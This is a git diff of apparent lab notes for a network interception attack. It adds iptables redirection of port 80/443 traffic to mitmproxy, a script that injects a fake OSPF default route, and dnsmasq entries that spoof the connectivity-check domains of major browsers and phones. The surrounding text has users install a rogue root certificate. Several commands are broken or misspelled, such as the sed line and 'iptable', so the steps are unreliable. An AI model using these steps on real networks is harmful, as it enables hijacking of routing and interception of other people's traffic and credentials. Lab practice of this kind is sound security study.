@@ -191,7 +191,30 @@ ASW2
 
 ## Setting up Hosts
 
-Kali
+# Route internal NIC to WLAN NIC using IPTABLES
+```
+# Enable IP Forwarding
+## Temporarily
+sudo sysctl -w net.ipv4.ip_forward=1
+## Permanent
+sudo sed -i '#net.ipv4.ip_forward=1' 'net.ipv4.ip_forward=1'
+
+# Check that only wlan0 has default route (delete default route for eth0 if exists)
+ip route
+
+sudo ip route del default via <ip_addr> dev eth0 proto static metric <metric value>
+
+# Configure IPTABLE
+sudo iptable -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-ports 8080
+sudo iptable -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-ports 8080
+sudo iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT
+sudo iptables -A FORWARD -i eth0 -o wlan0 -j ACCEPT
+sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
+# Check IPTABLE
+sudo iptables -t nat -L -v -n
+```
+
+# Kali
 ```
 # Setting static IP
 
@@ -202,34 +225,44 @@ sudo nmcli connection modify "Wired Connection 1" ipv4.address 192.168.10.100/24
 
 sudo nmcli connection down "Wired Connection 1" && sudo nmcli connectoin up "Wired Connection 1"
 
-#FRR setup
-sudo apt update && sudo apt install frr
 
-sudo sed -i 's/ospfd=no/ospfd=yes/' /etc/frr/daemon (check write perms)
+<!-- Skip, using custom python script -->
+<!-- #FRR setup -->
+<!-- sudo apt update && sudo apt install frr -->
+<!---->
+<!-- sudo sed -i 's/ospfd=no/ospfd=yes/' /etc/frr/daemon (check write perms) -->
+<!---->
+<!-- sudo systemctl start frr -->
+<!---->
+<!-- sudo vtysh -->
+<!---->
+<!-- conf t -->
+<!---->
+<!-- # Init ospf process -->
+<!-- router ospf -->
+<!--     ospf router-id 100.100.100.100 -->
+<!--     network 192.168.10.0/24 area 0 -->
+<!--     # Inject fake default route into OSPF database (metric-type 1 to take precedence over router's default metric value 1) -->
+<!--     default-information originate always metric-type 1 metric 1 -->
+<!-- end -->
+<!---->
+<!-- # Write to mem  -->
+<!-- write memory -->
+<!-- exit -->
 
-sudo systemctl start frr
-
-sudo vtysh
-
-conf t
-
-# Init ospf process
-router ospf
-    ospf router-id 100.100.100.100
-    network 192.168.10.0/24 area 0
-    # Inject fake default route into OSPF database (metric-type 1 to take precedence over router's default metric value 1)
-    default-information originate always metric-type 1 metric 1
-end
-
-# Write to mem 
-write memory
-exit
+# Run ospf-injector.py with root perms
+sudo python ./ospf-injector.py -h
+sudo python ./ospf-injector.py <interface> <router-id> [--dict | wordlist to use]
 
 # Verification
 On DSW1
 sh ip ospf neighbour
 |
-# Expect to see 100.100.100.100 with FULL state
+# Expect to see own router-id with FULL state
+|
+sh ip route ospf
+|
+# Expect to see kali ip as default route
 
 On DSW2
 sh ip route ospf
@@ -254,8 +287,21 @@ interface=eth0
 bind-interfaces
 
 /* add more domains if needed */
-address=/msftconnecttest.com/192.168.10.100
-address=/www.msftconnecttest.com/192.168.10.100
+/* Chrome */
+address=/msftconnecttest.com/<kali ip>
+address=/www.msftconnecttest.com/<kali ip>
+/* Firefox - may look for http://detectportal.firefox.com/success.txt */
+address=/detectportal.firefox.com/<kali ip>
+/* IOS/MacOS - http://captive.apple.com/hotspot-detect.html */
+address=/captive.apple.com/<kali ip>
+address=/appleiphonecell.com/<kali ip>
+address=/ibook.info/<kali ip>
+address=/airport.us/<kali ip>
+/* Android - url/generate_204 */
+address=/connectivitycheck.gstatic.com/<kali ip>
+address=/clients3.google.com/<kali ip>
+address=/www.gstatic.com/<kali ip>
+
 
 sudo systemctl restart dnsmasq
 
@@ -290,23 +336,6 @@ Get users to install cert under `Trusted Root Certication Authorities`
 
 # Run mitm
 `mitmproxy -w flows.mitm --listen-host 0.0.0.0 -p 8080`
-
-# Route internal NIC to WLAN NIC using IPTABLES
-```
-# Check that only wlan0 has default route (delete default route for eth0 if exists)
-ip route
-
-sudo ip route del default via <ip_addr> dev eth0 proto static metric <metric value>
-
-# Configure IPTABLE
-sudo iptable -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-ports 8080
-sudo iptable -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-ports 8080
-sudo iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT
-sudo iptables -A FORWARD -i eth0 -o wlan0 -j ACCEPT
-sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
-# Check IPTABLE
-sudo iptables -t nat -L -v -n
-```
 
 # Testing
 ```
